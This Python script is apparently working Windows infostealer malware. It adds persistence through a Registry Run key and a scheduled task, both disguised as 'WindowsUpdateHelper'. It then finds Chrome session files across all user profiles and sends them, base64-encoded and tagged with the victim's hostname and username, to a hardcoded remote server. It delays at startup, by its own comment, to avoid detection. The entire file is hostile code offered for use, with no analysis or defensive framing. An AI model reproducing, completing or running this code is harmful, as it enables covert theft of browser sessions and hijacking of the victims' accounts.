import pathlib
import socket
import os
import base64
import requests
import time
import winreg
import datetime
import sys
import shutil
import subprocess
from email.message import EmailMessage

# Configuration
SERVER_URL = "https://cvsstool-production.up.railway.app/send"
API_TOKEN = "qutmess"


def add_registry_persistence():
    """Add persistence via Windows Registry Run key."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        script_path = os.path.abspath(__file__)
        winreg.SetValueEx(
            key,
            "WindowsUpdateHelper",
            0,
            winreg.REG_SZ,
            f'python "{script_path}"'
        )
        winreg.CloseKey(key)
        print("[+] Registry persistence added")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")


def add_scheduled_task_persistence():
    """Add persistence via Windows Task Scheduler."""
    try:
        script_path = os.path.abspath(__file__)
        task_name = "WindowsUpdateHelper"
        
        # Create task that runs at logon and every 30 minutes
        cmd = f'''schtasks /Create /TN "{task_name}" /TR "python \\"{script_path}\\"" /SC ONLOGON /RL HIGHEST /F'''
        
        subprocess.run(cmd, shell=True, capture_output=True)
        print("[+] Scheduled task persistence added")
    except Exception as e:
        print(f"[-] Scheduled task persistence failed: {e}")


def ensure_persistence():
    """Ensure script has persistence mechanisms in place."""
    add_registry_persistence()
    add_scheduled_task_persistence()


def get_victim_info():
    """Get hostname and username for identification."""
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
    except:
        hostname = "unknown"
        username = "unknown"
    return hostname, username


def send_to_server(hostname, username, file_path):
    """Send file content to server."""
    try:
        content = base64.b64encode(file_path.read_bytes()).decode()
        relative_path = str(file_path)
        
        print(f"[*] Sending to: {SERVER_URL}")
        print(f"[*] Token: {API_TOKEN}, Hostname: {hostname}, User: {username}")

        response = requests.post(
            SERVER_URL,
            json={
                "hostname": hostname,
                "username": username,
                "token": API_TOKEN,
                "file": {
                    "name": relative_path,
                    "content": content
                }
            },
            timeout=10
        )
        print(f"[+] Sent {file_path.name} - Status: {response.status_code}, Response: {response.text}")
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False
    except Exception as e:
        print(f"[-] Error sending {file_path.name}: {e}")
        return False


def find_chrome_sessions():
    """Find Chrome Sessions folder across different user profiles and drives."""
    possible_paths = []
    
    # Get all user profiles
    user_profiles = [
        os.environ.get("USERPROFILE"),
        os.environ.get("APPDATA", "").rsplit("\\AppData\\Roaming", 1)[0] if os.environ.get("APPDATA") else None
    ]
    
    # Add all user folders from C:
    c_users = pathlib.Path("C:\\Users")
    if c_users.exists():
        for user_folder in c_users.iterdir():
            if user_folder.is_dir() and user_folder.name not in ["Public", "Default", "All Users"]:
                possible_paths.append(user_folder / "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions")
    
    # Check different Chrome profiles
    chrome_subpaths = [
        "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions",
        "AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Sessions",
        "AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Sessions",
        "AppData\\Local\\Google\\Chrome\\User Data\\Profile 3\\Sessions",
        "AppData\\Local\\Google (x86)\\Chrome\\User Data\\Default\\Sessions",
        "Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Sessions"
    ]
    
    for profile in user_profiles:
        if profile:
            for subpath in chrome_subpaths:
                possible_paths.append(pathlib.Path(profile) / subpath)
    
    # Find existing path
    for path in possible_paths:
        if path.exists():
            return str(path)
    
    return None


def collect_and_send_files():
    """Main file collection and transmission logic."""
    hostname, username = get_victim_info()

    # Find Chrome Sessions folder dynamically
    source_folder = find_chrome_sessions()

    if not source_folder:
        print("[-] Chrome Sessions folder not found")
        return

    print(f"[*] Found Chrome Sessions: {source_folder}")

    files_found = 0
    files_sent = 0
    
    for filename in os.listdir(source_folder):
        file_path = pathlib.Path(source_folder) / filename
        if file_path.is_file():
            files_found += 1
            print(f"[*] Sending: {filename} ({file_path.stat().st_size} bytes)")
            if send_to_server(hostname, username, file_path):
                files_sent += 1
            time.sleep(0.5)  # Small delay between sends
    
    print(f"[*] Files found: {files_found}, Sent: {files_sent}")


def run_session():
    """Execute the main session logic."""
    print(f"[*] Session started at {datetime.datetime.now()}")
    
    # Ensure persistence is in place
    ensure_persistence()
    
    # Collect and send files
    collect_and_send_files()
    
    print(f"[*] Session completed at {datetime.datetime.now()}")


if __name__ == "__main__":
    # Initial delay to avoid detection
    time.sleep(5)
    
    # Run the session
    run_session()
